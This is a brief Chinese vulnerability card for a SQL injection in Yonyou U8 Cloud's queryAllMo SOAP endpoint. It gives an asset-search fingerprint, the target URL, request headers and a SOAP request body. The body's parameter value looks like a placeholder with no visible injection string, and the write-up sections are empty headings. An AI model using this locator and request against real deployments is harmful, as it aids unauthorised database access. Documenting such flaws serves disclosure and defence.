# 用友U8CloudqueryAllMo存在SQL注入漏洞

- **系统**：用友　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="用友 U8 Cloud"`
- **请求**：`POST /uapws/service/nc.ws.itf.mm.mobile.IMoQuery HTTP/1.1`
- **关键头**：`Cookie: JSESSIONID=1EEDC1D7DC0B27ABD0731F81178DC50D.server; JSESSIONID=8BDDF6D86AFB789CF…`　`SOAPAction: urn:queryAllMo`　`Content-Type: text/xml;charset=UTF-8`　`Host: xx.xx.xx.xx`　`Content-Length: 360`

**请求体 / payload**
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:imoq="http://mobile.mm.itf.ws.nc/IMoQuery">
<soapenv:Header/>
<soapenv:Body>
<imoq:queryAllMo>
<moQueryVO>
<!--type: string-->
<wlbm>gero et</wlbm>
</moQueryVO>
</imoq:queryAllMo>
</soapenv:Body>
</soapenv:Envelope>
```

**其他**
- 用友U8 Cloud queryAllMo存在SQL注入漏洞: * 一、漏洞描述
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友U8 Cloud